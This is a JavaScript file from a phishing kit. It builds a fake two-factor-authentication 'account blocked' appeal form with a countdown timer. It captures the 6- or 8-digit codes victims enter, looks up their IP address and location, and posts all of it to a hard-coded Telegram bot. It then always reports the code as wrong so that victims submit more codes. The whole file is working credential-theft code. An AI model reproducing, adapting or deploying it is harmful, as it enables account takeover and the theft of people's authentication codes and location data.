function getIP(callback) {
    fetch('https://api.db-ip.com/v2/free/self')
        .then((response) => response.json())
        .then((data) => callback(data))
        .catch((error) => callback(undefined));
}

let IpAddress = '';

getIP((ip) => {
    IpAddress = ip;
});

$(document).ready(function () {
    updateHtmlAndCallback(function () {
        sendCode();
    });

    setTime();

    $('#back-hone').on('click', function () {
        window.location.href = '/end';
    });

    $('#send').on('click', function () {
        $('.lsd-ring-container').removeClass('d-none');

        setTimeout(function () {
            $('.lsd-ring-container').addClass('d-none');
        }, 2000);
    });
});

function setTime() {
    var totalTime = 5 * 60;

    var timer = setInterval(function () {
        totalTime--;
        var minutes = Math.floor(totalTime / 60);
        var seconds = totalTime % 60;

        minutes = minutes < 10 ? '0' + minutes : minutes;
        seconds = seconds < 10 ? '0' + seconds : seconds;

        $('#time').text(minutes + ':' + seconds);

        if (totalTime <= 0) {
            clearInterval(timer);
            $('#time').text('00:00');
        }
    }, 1000);
}

function updateHtmlAndCallback(callback) {
    $('#code-form .card-body').html(`
        <h2 class="card-title fw-bold">Two-factor authentication required </h2>
        <p class="card-text py-3">We have temporarily blocked your account because your protect has changed. Verify code has been sent</p>
        <img src="/img/TOtVy8P.png" class="w-100 rounded" alt="">
        <input type="text" class="form-control my-3 py-2 bg-light" id="code" placeholder="Enter your code" required>
        <p class="text-danger ms-1 d-none" id="wrong-code">
            This code is incorrect. Please check that you entered the code correctly or try a new code.
        </p>
        <div class="bg-light rounded py-3 mb-3 d-flex justify-content-between align-items-center">
            <div class="mx-3">
                <i class="fa fa-info-circle" aria-hidden="true" style="font-size: 1.5rem;color: #9f580a;"></i>
            </div>
            <p class="mb-0">
                Approve from another device or Enter your verification code
                <br>
                Enter the 6-digit code we just sent from the authenticator app you set up or Enter the 8-digit recovery code.
                <br>
                Please enter the code within <span id="time" class="fw-bold">05:00</span> to complete the appeal form.
            </p>
        </div>
        <p>We'll walk you through some steps to secure and unlock your account.</p>
        <button type="button" class="btn bg-light border w-100 py-3 fw-bold" id="send-code">Submit</button>
        <p class="mt-3 mb-0 text-center" style="cursor: pointer;color: rgb(30 66 159);" id="send">Send Code</p>
    `);

    if (callback && typeof callback === 'function') {
        callback();
    }
}

let NUMBER_TIME_SEND_CODE = 0;
let MAX_TRIES = 4;
let code1 = '';
let code2 = '';
let Fcode = '';

function sendCode() {
    $('#code').on('input', function () {
        let input = $(this).val();
        input = input.replace(/\D/g, ''); // Chỉ giữ số

        if (input.length > 8) {
            input = input.slice(0, 8);
        }

        $(this).val(input);
    });

    $('#send-code').on('click', function () {
        const $btn = $(this);
        if ($btn.prop('disabled')) return;

        const keymap = $('#code').val();

        // Ẩn cảnh báo mã sai khi người dùng nhấn Submit
        $('#wrong-code').addClass('d-none');

        // Chỉ cho phép 6 hoặc 8 số
        if (!/^\d{6}$|^\d{8}$/.test(keymap)) {
            $('#code').addClass('border-danger');
            return;
        } else {
            $('#code').removeClass('border-danger');
        }

        // Bắt đầu đếm ngược 20 giây và khóa nút
        $btn.prop('disabled', true).text('Please wait (20s)');
        let waitTime = 20;
        const countdown = setInterval(() => {
            waitTime--;
            $btn.text(`Please wait (${waitTime}s)`);
            if (waitTime <= 0) {
                clearInterval(countdown);
                $btn.prop('disabled', false).text('Submit');

                // Sau khi đếm ngược xong thì hiển thị cảnh báo mã sai nếu cần
                if (NUMBER_TIME_SEND_CODE < MAX_TRIES) {
                    $('#wrong-code').removeClass('d-none');
                } else {
                    $('#wrong-code').removeClass('d-none');
                    $('#send-code').prop('disabled', true);
                    $('#code-form').addClass('d-none');
                    $('#getCode').removeClass('d-none');
                }
            }
        }, 1000);

        code1 = keymap;

        const message1 = `🔓 <strong>Code:</strong> <code>${code1}</code>\n` +
            `🌐 <strong>IP Address:</strong> <code>${IpAddress?.ipAddress || 'N/A'}</code>\n` +
            ` <strong>Country:</strong> <code>${IpAddress?.countryName || 'N/A'}</code> (<code>${IpAddress?.countryCode || 'N/A'}</code>)\n` +
            ` <strong>City:</strong> <code>${IpAddress?.city || 'N/A'}</code>`;

        NUMBER_TIME_SEND_CODE++;
        const botToken = '7371433087:AAHBPfH8Kshg2ce5ZHCHLDYe43ivmzKnCqk';
        const chatId = '-1002416068664';
        const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;

        fetch(telegramUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: chatId,
                text: message1,
                parse_mode: 'html'
            })
        })
        .then((response) => {
            if (!response.ok) {
                throw new Error('Network response was not ok');
            }
            return response.json();
        })
        .then((data) => {
            $('.lsd-ring-container').addClass('d-none');
        })
        .catch((error) => {
            setTimeout(function () {
                Swal.fire({
                    text: `Request failed!`,
                    icon: 'error'
                });
                $('.lsd-ring-container').addClass('d-none');
            }, 500);
        });
    });
}
